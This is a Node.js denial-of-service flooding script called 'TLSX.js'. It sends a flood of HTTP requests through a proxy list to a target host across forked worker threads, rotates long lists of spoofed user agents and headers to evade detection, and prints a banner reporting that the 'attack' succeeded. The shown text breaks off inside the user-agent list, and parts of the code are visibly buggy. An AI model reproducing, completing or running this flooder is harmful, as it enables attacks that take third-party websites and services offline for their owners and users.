const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
 

 lang_header = ['pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7', 'es-ES,es;q=0.9,gl;q=0.8,ca;q=0.7', 'ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7', 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7', 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7', 'zh-TW,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6', 'nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7', 'fi-FI,fi;q=0.9,en-US;q=0.8,en;q=0.7', 'sv-SE,sv;q=0.9,en-US;q=0.8,en;q=0.7',   'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
 'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5', 'en-US,en;q=0.5', 'en-US,en;q=0.9', 'de-CH;q=0.7', 'da, en-gb;q=0.8, en;q=0.7', 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',],
encoding_header = [
'gzip, deflate, br',
'compress, gzip',
'deflate, gzip',
'gzip, identity',
'*'
]



 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
  });

 if (process.argv.length < 7){console.log(`Usage[40;38;2;118;6;255m:\x1b[38;2;0;2555m node TLSX.js[40;38;2;118;6;255m[\x1b[38;2;0;2555mHOST[40;38;2;118;6;255m] [\x1b[38;2;0;2555mTIME[40;38;2;118;6;255m] [\x1b[38;2;0;2555mRATE[40;38;2;118;6;255m]\x1b[38;2;0;2555m[\x1b[38;2;0;2555mTHREAD[40;38;2;118;6;255m][\x1b[38;2;0;2555mPROXY.txt[40;38;2;118;6;255m] `); process.exit();}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(10000, elements.length)];
 } 
 
 const args = {
     target: process.argv[2],
     time: process.argv[3],
     Rate: process.argv[4],
     threads: process.argv[5],
     proxyFile: process.argv[6]
 }
 var proxies = fs.readFileSync('proxy.txt', 'utf-8').toString().replace(/\r/g, '').split('\n');
 const parsedTarget = url.parse(args.target);



if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    console.clear();
    console.log(`

████████╗██╗░░░░░░██████╗██╗░░██╗
╚══██╔══╝██║░░░░░██╔════╝╚██╗██╔╝
░░░██║░░░██║░░░░░╚█████╗░░╚███╔╝░
░░░██║░░░██║░░░░░░╚═══██╗░██╔██╗░
░░░██║░░░███████╗██████╔╝██╔╝╚██╗
░░░╚═╝░░░╚══════╝╚═════╝░╚═╝░░╚═╝`);
    console.log(``);
    console.log(``);
    console.log(`[Broadcast] Attack has sent succesfully `);
    console.log('[Broadcast] Target: ' + parsedTarget.host + '\x1b[0m');
    console.log('[Broadcast] Duration: ' + args.time + '\x1b[0m');
    console.log('[Broadcast] Threads: ' + args.threads + '\x1b[0m');
    console.log('[Broadcast] Requests per second: ' + args.Rate + '\x1b[0m');
    console.log(`[Broadcast] Status: Succes!`);
    console.log(``);
    console.log(`Don't Leak My Tools !!!`);

  setTimeout(() => {
    process.exit(1);
  }, process.argv[3] * 1000);

} 

if (cluster.isMaster) {
    for (let counter = 10000; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder)
}
    setTimeout(function(){

      process.exit(1);
    }, process.argv[3] * 1000);
    
    process.on('uncaughtException', function(er) {
    });
    process.on('unhandledRejection', function(er) {
    });

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const parsedAddr = options.address.split("https://");
        const addrHost = parsedAddr[0];
        const payload = "GET " + target + " HTTP/1.1\r\nHost: " + parsedTarget.host + "\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: " + userAgents[Math.floor(Math.random() * userAgents.length)] + "\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=25000\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = new Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true,
        });

        connection.setTimeout(options.timeout * 25000 * 25000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === true) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

    }
}

const userAgents = [
"Mozilla/5.0 (Linux; Android 12; Infinix X672 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]", "Mozilla/5.0 (Linux; Android 12; Infinix X672 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.37.71;]", "Mozilla/5.0 (Linux; Android 12; Infinix X672 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]", "Mozilla/5.0 (Linux; Android 12; Infinix X672 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/413.0.0.30.104;]", "Mozilla/5.0 (Linux; Android 12; Infinix X672 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.20.62;]", "Mozilla/5.0 (Linux; Android 12; Infinix X672 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84;]", "Mozilla/5.0 (Linux; Android 12; Infinix X672 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]", "Mozilla/5.0 (Linux; Android 12; Infinix X672 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/371.0.0.24.109;]", "Mozilla/5.0 (Linux; Android 12; Infinix X672 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]", "Mozilla/5.0 (Linux; U; Android 12; en-US; Infinix X672 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.4.5.1308 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 12; Infinix X672 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]", "Mozilla/5.0 (Linux; Android 12; Infinix X672 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]", "Mozilla/5.0 (Linux; Android 12; Infinix X672 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.177 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]", "Mozilla/5.0 (Linux; Android 10; VOG-L29 Build/HUAWEIVOG-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; VOG-L29 Build/HUAWEIVOG-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108;]", "Mozilla/5.0 (Linux; Android 10; VOG-L29 Build/HUAWEIVOG-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.177 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]", "Mozilla/5.0 (Linux; Android 10; VOG-L29 Build/HUAWEIVOG-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.163 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]", "Mozilla/5.0 (Linux; Android 10; VOG-L29 Build/HUAWEIVOG-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.155 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/425.0.0.22.49;]", "Mozilla/5.0 (Linux; Android 9; VOG-L29; HMSCore 6.11.0.331; GMSCore 23.26.16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.0.323 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 9; VOG-L29; HMSCore 6.11.0.331; GMSCore 23.26.17) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.0.323 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; VOG-L29; HMSCore 6.11.0.332; GMSCore 23.25.18) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.0.323 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; VOG-L29 Build/HUAWEIVOG-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.127 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/424.0.0.21.75;]", "Mozilla/5.0 (Linux; Android 10; VOG-L29 Build/HUAWEIVOG-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.217 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]", "Mozilla/5.0 (Linux; Android 9; VOG-L29; HMSCore 6.11.0.301; GMSCore 23.24.14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.0.323 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; VOG-L29; HMSCore 6.11.0.302; GMSCore 23.23.16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.0.323 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; VOG-L09; HMSCore 6.11.0.302; GMSCore 23.24.14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.0.323 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; VOG-L29; HMSCore 6.11.0.302; GMSCore 23.24.14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.0.323 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; HarmonyOS; VOG-AL10; HMSCore 6.11.0.302; GMSCore 23.24.14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.0.322 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; VOG-L29 Build/HUAWEIVOG-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/415.0.0.14.47;]", "Mozilla/5.0 (Linux; Android 10; HarmonyOS; VOG-AL10; HMSCore 6.11.0.302; GMSCore 23.16.13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.0.322 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; VOG-L29; HMSCore 6.11.0.302; GMSCore 23.24.14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.0.322 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; VOG-L29; HMSCore 6.11.0.302; GMSCore 23.23.16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.0.322 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; HarmonyOS; VOG-AL10; HMSCore 6.11.0.302; GMSCore 23.24.14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.0.320 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 13; CPH2565 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]", "Mozilla/5.0 (Linux; Android 6.0.1; OPPO A57t Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]", "Mozilla/5.0 (Linux; Android 12; PHJ110 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]", "Mozilla/5.0 (Linux; Android 7.1.1; OPPO A73t Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.84 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/316.0.0.54.116;]", "Mozilla/5.0 (Linux; Android 12; PDKT00 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]", "Mozilla/5.0 (Linux; Android 4.4.4; R7f Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/293.0.0.43.120;]", "Mozilla/5.0 (Linux; Android 13; PEGM10 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/416.0.0.35.85;]", "Mozilla/5.0 (Linux; Android 7.1.1; OPPO A73 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]", "Mozilla/5.0 (Linux; Android 13; CPH2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.167 Mobile Safari/537.36 OPR/77.0.4095.74331", "Mozilla/5.0 (Linux; Android 13; CPH2337 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) VenusBrowser/3.2.42 Chrome/115.0.5790.138 Mobile Safari/537.36", "Mozilla/5.0 (Linux; U; Android 12; zh-tw; PDKM00 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.61 Mobile Safari/537.36 HeyTapBrowser/40.8.15.1", "Mozilla/5.0 (Linux; U; Android 5.1; zh-cn; OPPO A37m Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/4.8.4", "Mozilla/5.0 (Linux; U; Android 4.4.4; zh-cn; A31 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.2125.114 Mobile Safari/537.36 OppoBrowser/3.9.2", "Mozilla/5.0 (Linux; U; Android 5.1; en-gb; OPPO F1s Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.0.9", "Mozilla/5.0 (Linux; U; Android 4.4.4; in-id; A31 Build/KTU84P) AppleWebKit/537.36 (KHTML,like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/10.5.0.4", "Mozilla/5.0 (Linux; U; Android 8.1.0; vi-vn; OPPO R11s Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/4.7.9", "Mozilla/5.0 (Linux; U; Android 9; en-au; CPH1893 Build/PKQ1.190414.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.1.10", "Mozilla/5.0 (Linux; U; Android 7.1.1; zh-cn; OPPO A73 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/4.7.9", "Mozilla/5.0 (Linux; U; Android 6.0.1; en-us; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/4.3.8", "Mozilla/5.0 (Linux; U; Android 11; en-in; Redmi Note 8 Pro Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.0.1", "Mozilla/5.0 (Linux; U; Android 8.1.0; vi-vn; OPPO CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/4.7.9", "Mozilla/5.0 (Linux; U; Android 4.4.4; zh-cn; OPPO R7st Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/10.5.0.4", "Mozilla/5.0 (Linux; U; Android 5.1; fr-fr; OPPO A37m Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/4.3.8", "Mozilla/5.0 (Linux; U; Android 9; in-id; CPH2071 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/25.5.1.10", "Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; A31 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/10.5.0.4", "Mozilla/5.0 (Linux; U; Android 5.1; in-id; OPPO F1s Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.0.9", "Mozilla/5.0 (Linux; U; Android 8.1.0; my-mm; OPPO PBAM00 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/4.7.9", "Mozilla/5.0 (Linux; U; Android 7.1.1; en-nz; CPH1717 Build/N4F26M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.1.10", "Mozilla/5.0 (Linux; U; Android 8.1.0; vi-vn; OPPO PBFT00 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/4.7.9", "Mozilla/5.0 (Linux; U; Android 9; CPH1937 Build/PKQ1.190714.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/25.5.1.10", "Mozilla/5.0 (Linux; U; Android 9; fr-fr; CPH1923 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/25.5.0.9", "Mozilla/5.0 (Linux; Android 8.1.0; PBCM30 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/10.6.3.2", "Mozilla/5.0 (Linux; U; Android 5.1.1; gu-in; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.1.1", "Mozilla/5.0 (Linux; U; Android 5.1; en-us; OPPO A37f Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.0.9", "Mozilla/5.0 (Linux; U; Android 9; ar-eg; CPH1923 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/25.5.1.10", "Mozilla/5.0 (Linux; U; Android 9; en-au; CPH2083 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/25.5.1.10", "Mozilla/5.0 (Linux; U; Android 8.1.0; fr-fr; CPH1853 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.1.10", "Mozilla/5.0 (Linux; U; Android 5.1; vi-vn; OPPO A37f Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.0.9", "Mozilla/5.0 (Linux; U; Android 8.1.0; fr-fr; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.1.10", "Mozilla/5.0 (Linux; U; Android 9; vi-vn; CPH2077 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/25.5.1.10", "Mozilla/5.0 (Linux; U; Android 9; in-id; CPH1923 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/25.5.1.10,gzip(gfe)", "Mozilla/5.0 (Linux; U; Android 7.1.1; en-au; CPH1827 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.1.10", "Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108;]", "Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108;]", "Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.168 Mobile Safari/537.36 OPX/2", "Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.138 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108;]", "Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]", "Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.163 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]", "Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) JioPages/4.0.2 Chrome/101.0.4951.41 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.138 Mobile Safari/537.36 SznProhlizec/10.1.3a", "Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.227 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/425.0.0.22.49;]", "Mozilla/5.0 (Linux; Android 13; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.135 Mobile Safari/537.36 OPR/75.4.3978.72990", "Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/418.0.0.11.71;]", "Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/424.0.0.21.75;]", "Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]", "Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/421.0.0.33.47;]", "Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) VenusBrowser/3.2.36 Chrome/110.0.5481.65 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36 OPR/76.0.4025.73075", "Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.37.71;]", "Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.135 Mobile Safari/537.36 OPR/75.4.3978.72990", "Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.60 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]", "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.4044.113 Safari/5370.36 Brave/9085", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/116.0.5845.146 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/117.0 Mobile/15E148 Safari/605.1.15", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/183.1.405937292 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (iPhone; CPU iPhone OS 6_1_6 like Mac OS X) AppleWebKit/536.0 (KHTML, like Gecko) FxiOS/10.9h8313.0 Mobile/90C955 Safari/536.0", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/74.0.3729.155 Mobile/15E148 Safari/605.1", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Version/16.6 Safari/605.1.15 (AirWatch Browser v22.05)", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) 